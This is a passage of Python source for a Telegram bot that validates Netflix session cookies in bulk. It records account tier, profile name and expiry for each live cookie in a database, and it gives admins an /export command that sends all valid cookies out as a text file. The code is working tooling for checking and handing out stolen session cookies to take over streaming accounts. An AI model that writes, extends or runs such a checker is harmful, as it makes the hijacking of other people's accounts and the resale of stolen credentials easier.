            f"{get_emoji('⛔️')} Too many cookies: {total} (max {MAX_BULK_CHECK}).", parse_mode="HTML"
        )
        return ConversationHandler.END
    # Process all cookies
    msg = await update.message.reply_text(
        f"{get_emoji('🚀')} Starting validation of {total} cookies...", parse_mode="HTML"
    )
    # Add to DB
    added = db.add_cookies_bulk(all_cookies, update.effective_user.id)
    valid_added = [a for a in added if a.get('status') == 'added']
    if not valid_added:
        await msg.edit_text(f"{get_emoji('❌')} No valid cookies added.", parse_mode="HTML")
        return ConversationHandler.END
    # Check
    progress_msg = await update.message.reply_text(
        f"{get_emoji('⏳')} Checking: 0/{len(valid_added)}", parse_mode="HTML"
    )
    async def progress_callback(current, total):
        if current % 5 == 0 or current == total:
            try:
                await progress_msg.edit_text(
                    f"{get_emoji('⏳')} Checking: {current}/{total}", parse_mode="HTML"
                )
            except:
                pass
    results = await NetflixChecker.check_bulk_cookies(
        [c["cookie"] for c in valid_added], progress_callback
    )
    valid_count = 0
    for res in results:
        cookie = res.get("cookie", "")
        if not cookie:
            continue
        c_hash = hashlib.sha256(cookie.encode()).hexdigest()
        doc = db.get_cookie_by_hash(c_hash)
        if doc:
            if res.get("valid"):
                db.update_cookie_status(doc["_id"], "valid", {
                    "account_tier": res.get("account_tier"),
                    "profile_name": res.get("profile_name"),
                    "profile_language": res.get("profile_language"),
                    "maturity_level": res.get("maturity_level"),
                    "expires_at": res.get("expires_at")
                })
                valid_count += 1
            else:
                status = "expired" if "expired" in str(res.get("error", "")).lower() else "invalid"
                db.update_cookie_status(doc["_id"], status, {"error": res.get("error")})
            db.log_check(update.effective_user.id, doc["_id"], res.get("valid") and "valid" or "invalid", res)
    db.increment_user_stats(update.effective_user.id, len(results), valid_count)
    await progress_msg.edit_text(
        f"{format_header('Bulk Complete', '📊')}\n{SEP}\n"
        f"{get_emoji('📥')} Processed: <code>{len(results)}</code>\n"
        f"{get_emoji('✅')} Valid: <code>{valid_count}</code>\n"
        f"{get_emoji('❌')} Invalid: <code>{len(results)-valid_count}</code>",
        parse_mode="HTML"
    )
    return ConversationHandler.END

async def bulk_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop('bulk_files', None)
    context.user_data.pop('bulk_total', None)
    await update.message.reply_text(f"{get_emoji('❌')} Bulk operation cancelled.", parse_mode="HTML")
    return ConversationHandler.END

# ========================== ADMIN COMMANDS =============================
@admin_required
async def admin_approve(update, context):
    try:
        if not context.args:
            await update.message.reply_text("Usage: /approve <user_id>")
            return
        user_id = int(context.args[0])
        db.create_user(user_id)
        if db.approve_user(user_id):
            await update.message.reply_text(f"{get_emoji('✅')} User {user_id} approved.")
            try:
                await context.bot.send_message(user_id, f"{get_emoji('✅')} Your account is approved!")
            except:
                pass
        else:
            await update.message.reply_text("Failed.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_required
async def admin_disapprove(update, context):
    try:
        if not context.args:
            await update.message.reply_text("Usage: /disapprove <user_id>")
            return
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(f"{get_emoji('✅')} User {user_id} disapproved.")
        else:
            await update.message.reply_text("Failed.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_required
async def admin_users(update, context):
    users = list(db.users.find({"user_id": {"$ne": None}}))
    if not users:
        await update.message.reply_text("No users.")
        return
    approved = sum(1 for u in users if u.get("approved", False))
    admins = sum(1 for u in users if u.get("is_admin", False))
    response = f"{format_header('Users', '👥')}\n{SEP}\nTotal: {len(users)}, Approved: {approved}, Admins: {admins}\n\n"
    for u in users[:15]:
        status = get_emoji('✅') if u.get("approved") else get_emoji('❌')
        if u.get("is_admin"):
            status = get_emoji('👑')
        response += f"{status} <code>{u['user_id']}</code> – checks: {u.get('total_checks', 0)}\n"
    if len(users) > 15:
        response += f"\n... and {len(users)-15} more."
    await update.message.reply_text(response, parse_mode="HTML")

@admin_required
async def admin_export(update, context):
    cookies = db.get_valid_cookies()
    if not cookies:
        await update.message.reply_text("No valid cookies.")
        return
    os.makedirs(EXPORT_DIR, exist_ok=True)
    filename = f"netflix_valid_{int(time.time())}.txt"
    path = os.path.join(EXPORT_DIR, filename)
    with open(path, 'w') as f:
        f.write("# Netflix Valid Cookies\n")
        for c in cookies:
            f.write(c['cookie'] + "\n")
    with open(path, 'rb') as f:
        await update.message.reply_document(document=f, filename=filename, caption=f"Exported {len(cookies)} cookies.")
    os.remove(path)

@admin_required
async def admin_cleanup(update, context):
    msg = await update.message.reply_text("Cleaning up...")
    deleted = db.delete_invalid_cookies()
    await msg.edit_text(f"{get_emoji('✅')} Deleted {deleted} invalid/expired cookies.")

@admin_required
async def admin_clear(update, context):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Yes", callback_data="clear_confirm"),
         InlineKeyboardButton("❌ Cancel", callback_data="clear_cancel")]
    ])
    await update.message.reply_text(
        f"{get_emoji('⚠️')} <b>Delete ALL cookies?</b>\nThis cannot be undone.",
        reply_markup=keyboard, parse_mode="HTML"
    )

async def clear_callback(update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "clear_confirm":
        count = db.clear_all_cookies()
        await query.edit_message_text(f"{get_emoji('✅')} Cleared {count} cookies.")
    else:
        await query.edit_message_text("Cancelled.")

# ========================== CALLBACKS ==================================
async def callback_handler(update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "restart":
        await start(update, context)
        await query.edit_message_text("Restarted.")
    elif data.startswith("upload_"):
        await query.edit_message_text("Use /bulk to upload files.")

# ========================== ERROR HANDLER ==============================
async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    try:
        await update.message.reply_text("Internal error. Try again later.")
    except:
        pass

# ========================== MAIN ======================================
start_time = time.time()

def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)
    app = Application.builder().token(BOT_TOKEN).build()
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("check", check_single))
    app.add_handler(CommandHandler("login", login_command))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("valid", valid_cookies))
    app.add_handler(CommandHandler("status", status_command))

    # Bulk conversation
    bulk_conv = ConversationHandler(
        entry_points=[CommandHandler("bulk", bulk_start)],
        states={
            BULK_FILES_STATE: [
                MessageHandler(filters.Document.ALL, handle_bulk_file),
                CommandHandler("done", bulk_done),
            ]
        },
        fallbacks=[CommandHandler("cancel", bulk_cancel)]
    )
    app.add_handler(bulk_conv)

    # Admin
    app.add_handler(CommandHandler("approve", admin_approve))
    app.add_handler(CommandHandler("disapprove", admin_disapprove))
    app.add_handler(CommandHandler("users", admin_users))
    app.add_handler(CommandHandler("export", admin_export))
    app.add_handler(CommandHandler("cleanup", admin_cleanup))
    app.add_handler(CommandHandler("clear", admin_clear))

    # Message handler for direct cookie
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_message))

    # Callbacks
    app.add_handler(CallbackQueryHandler(callback_handler, pattern="^(upload_|restart)"))
    app.add_handler(CallbackQueryHandler(clear_callback, pattern="^clear_"))

    app.add_error_handler(error_handler)
    logger.info("Bot started.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()